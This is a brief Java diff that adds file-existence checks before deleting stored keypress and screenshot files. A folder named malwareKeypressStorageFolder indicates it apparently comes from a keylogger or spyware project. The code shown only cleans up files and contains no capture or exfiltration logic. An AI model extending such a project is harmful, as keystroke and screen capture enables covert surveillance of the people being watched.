@@ -146,7 +146,9 @@ public class FileUtil {
 
     public void deleteKeypressFile() {
         File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
-        keypressFile.delete();
+
+        if(keypressFile.exists())
+            keypressFile.delete();
     }
 
     public void deleteScreenshotFiles(){
@@ -155,7 +157,8 @@ public class FileUtil {
 
         for (int i = 0; i < files.length; i++)
         {
-            files[i].delete();
+            if(files[i].exists())
+                files[i].delete();
         }
     }
 
